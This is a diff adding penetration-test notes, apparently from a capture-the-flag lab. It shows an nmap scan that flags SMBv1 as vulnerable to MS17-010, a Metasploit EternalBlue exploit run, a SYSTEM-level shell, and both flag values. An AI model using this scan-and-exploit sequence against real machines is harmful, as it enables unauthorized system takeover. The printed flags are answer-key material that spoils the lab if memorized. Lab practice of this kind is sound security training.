@@ -31,3 +31,120 @@ Host script results:
 | smb2-time: 
 |   date: 2021-05-10T12:05:29
 |_  start_date: 2021-05-10T12:01:43
+
+===========================
+└─# nmap -p445 --script vuln 10.10.10.40
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-10 15:05 EAT
+Nmap scan report for 10.10.10.40
+Host is up (0.32s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+meterpreter > shell
+Process 696 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd ../../
+cd ../../
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\
+
+14/07/2009  04:20    <DIR>          PerfLogs
+24/12/2017  03:23    <DIR>          Program Files
+14/07/2017  17:58    <DIR>          Program Files (x86)
+14/07/2017  14:48    <DIR>          Share
+21/07/2017  07:56    <DIR>          Users
+15/01/2021  11:42    <DIR>          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)  17,446,567,936 bytes free
+
+C:\>cd Users
+cd Users
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users
+
+21/07/2017  07:56    <DIR>          .
+21/07/2017  07:56    <DIR>          ..
+21/07/2017  07:56    <DIR>          Administrator
+14/07/2017  14:45    <DIR>          haris
+12/04/2011  08:51    <DIR>          Public
+               0 File(s)              0 bytes
+               5 Dir(s)  17,446,567,936 bytes free
+
+C:\Users>cd haris
+cd haris
+
+C:\Users\haris>cd Desktop
+cd Desktop
+
+C:\Users\haris\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users\haris\Desktop
+
+24/12/2017  03:23    <DIR>          .
+24/12/2017  03:23    <DIR>          ..
+21/07/2017  07:54                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  17,446,567,936 bytes free
+
+C:\Users\haris\Desktop>type user.txt
+type user.txt
+4c546aea7dbee75cbd71de245c8deea9
+C:\Users\haris\Desktop>cd ../../Administrator/Desktop
+cd ../../Administrator/Desktop
+
+C:\Users\Administrator\Desktop>dir 
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users\Administrator\Desktop
+
+24/12/2017  03:22    <DIR>          .
+24/12/2017  03:22    <DIR>          ..
+21/07/2017  07:57                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  17,446,567,936 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+ff548eb71e920ff6c08843ce9df4e717
